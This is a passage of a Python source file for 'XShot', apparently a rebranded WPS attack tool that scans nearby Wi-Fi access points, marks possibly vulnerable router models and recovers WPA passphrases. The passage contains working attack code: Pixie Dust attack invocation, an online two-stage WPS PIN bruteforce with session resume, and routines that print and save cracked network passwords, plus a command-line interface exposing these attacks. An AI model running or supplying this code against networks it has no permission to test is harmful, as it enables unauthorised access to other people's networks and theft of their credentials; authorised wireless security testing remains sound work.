                    pin = self.generator.get_likely(bssid) or '12345670'
            elif not pbc_mode:
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print(f"\n{RED}Aborting…{NC}")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print(f"{RED}[!] Not enough data to run Pixie Dust attack{NC}")
                return False
        else:
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid: str, f_half: str, delay: Optional[float] = None) -> Optional[str]:
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print(f"{GREEN}[+] First half found{NC}")
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print(f"{RED}[!] WPS transaction failed, re-trying last pin{NC}")
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print(f"{RED}[-] First half not found{NC}")
        return None

    def __second_half_bruteforce(self, bssid: str, f_half: str, s_half: str, delay: Optional[float] = None) -> Optional[str]:
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print(f"{RED}[!] WPS transaction failed, re-trying last pin{NC}")
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return None

    def smart_bruteforce(self, bssid: str, start_pin: Optional[str] = None, delay: Optional[float] = None):
        if (not start_pin) or (len(start_pin) < 4):
            try:
                filename = self.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
                with open(filename, 'r') as file:
                    if input(f'{BLUE}[?] Restore previous session for {bssid}? [n/Y] {NC}').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print(f"\n{RED}Aborting…{NC}")
            filename = self.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print(f"{CYAN}[i] Session saved in {filename}{NC}")
            if args.loop:
                raise KeyboardInterrupt

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()

class WiFiScanner:
    def __init__(self, interface: str, vuln_list: Optional[str] = None):
        self.interface = interface
        self.vuln_list = vuln_list
        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/xshot_stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader)  # Skip header
                self.stored = [(row[1], row[2]) for row in csvReader]
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Optional[Dict[int, Dict]]:
        def handle_network(line, result, networks):
            networks.append({
                'Security type': 'Unknown',
                'WPS': False,
                'WPS locked': False,
                'Model': '',
                'Model number': '',
                'Device name': ''
            })
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = f'iw dev {self.interface} scan'
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print(f"{RED}[!] Error: {line}{NC}")
                return None
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = regexp.match(line)
                if res:
                    handler(line, res, networks)

        networks = [n for n in networks if n['WPS']]
        if not networks:
            return None

        networks.sort(key=lambda x: x['Level'], reverse=True)
        network_list = {i + 1: network for i, network in enumerate(networks)}

        if self.vuln_list:
            print(f"{YELLOW}Network marks: {GREEN}Possibly vulnerable{NC} | {RED}WPS locked{NC} | {YELLOW}Already stored{NC}")
        print(f"{BLUE}Networks list:{NC}")
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format('#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = f"{network['Model']} {network['Model number']}"
            essid = truncateStr(network['ESSID'], 25)
            deviceName = truncateStr(network['Device name'], 27)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, network['BSSID'], essid, network['Security type'], network['Level'], deviceName, model
            )
            color = None
            if (network['BSSID'], network['ESSID']) in self.stored:
                color = 'yellow'
            elif network['WPS locked']:
                color = 'red'
            elif self.vuln_list and (model in self.vuln_list):
                color = 'green'
            if color:
                print(colored(line, color=color))
            else:
                print(line)

        return network_list

    def prompt_network(self) -> Optional[str]:
        networks = self.iw_scanner()
        if not networks:
            print(f"{RED}[-] No WPS networks found.{NC}")
            return None
        while True:
            networkNo = input(f'{BLUE}Select target (Enter to refresh): {NC}')
            if networkNo.lower() in ('r', '0', ''):
                return self.prompt_network()
            try:
                num = int(networkNo)
                if num in networks:
                    return networks[num]['BSSID']
            except ValueError:
                print(f"{RED}Invalid number{NC}")

def truncateStr(s: str, length: int, postfix: str = '…') -> str:
    if len(s) > length:
        k = length - len(postfix)
        s = s[:k] + postfix
    return s

def colored(text: str, color: Optional[str] = None) -> str:
    if color == 'green':
        return f'\033[92m{text}\033[00m'
    if color == 'red':
        return f'\033[91m{text}\033[00m'
    if color == 'yellow':
        return f'\033[93m{text}\033[00m'
    return text

def ifaceUp(iface: str, down: bool = False) -> bool:
    action = 'down' if down else 'up'
    cmd = f'ip link set {iface} {action}'
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    return res.returncode == 0

def die(msg: str):
    sys.stderr.write(msg + '\n')
    sys.exit(1)

def usage():
    return f"""
XShot v1.0 (Powered by Team AX - https://team-ax.top/)

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""

if __name__ == '__main__':
    import argparse

    print_banner()

    parser = argparse.ArgumentParser(
        description='XShot v1.0 - Powered by Team AX (https://team-ax.top/)',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-i', '--interface', type=str, required=True, help='Name of the interface to use')
    parser.add_argument('-b', '--bssid', type=str, help='BSSID of the target AP')
    parser.add_argument('-p', '--pin', type=str, help='Use the specified pin (arbitrary string or 4/8 digit pin)')
    parser.add_argument('-K', '--pixie-dust', action='store_true', help='Run Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true', help='Always print Pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true', help='Run online bruteforce attack')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true', help='Run WPS push button connection')
    parser.add_argument('-d', '--delay', type=float, help='Set the delay between pin attempts')
    parser.add_argument('-w', '--write', action='store_true', help='Write credentials to the file on success')
    parser.add_argument('--iface-down', action='store_true', help='Down network interface when the work is finished')
    parser.add_argument('--vuln-list', type=str, default='vulnwsc.txt', help='Use custom file with vulnerable devices list')
    parser.add_argument('-l', '--loop', action='store_true', help='Run in a loop')
    parser.add_argument('-r', '--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks. Useful on small displays')
    parser.add_argument('--mtk-wifi', action='store_true', help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die(f"{RED}The program requires Python 3.6 and above{NC}")
    if os.getuid() != 0:
        die(f"{RED}Run it as root{NC}")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die(f"{RED}Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): /dev/wmtWifi does not exist or it is not a character device{NC}")
        wmtWifi_device.chmod(0o644)
        with open(wmtWifi_device, 'w') as f:
            f.write("1")

    if not ifaceUp(args.interface):
        die(f'{RED}Unable to up interface "{args.interface}"{NC}')

    while True:
        try:
            companion = Companion(args.interface, args.write, args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print(f"{BLUE}[*] BSSID not specified (--bssid) — scanning for available networks{NC}")
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = Companion(args.interface, args.write, args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input(f"\n{RED}[?] Exit the script (otherwise continue to AP scan)? [N/y] {NC}").lower() == 'y':
                    print(f"{RED}Aborting…{NC}")
                    break
                else:
                    args.bssid = None
            else:
                print(f"\n{RED}Aborting…{NC}")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        with open(wmtWifi_device, 'w') as f:
            f.write("0")

    print(f"{GREEN}[✓] Done! Visit https://team-ax.top/ for more tools 🔥{NC}")
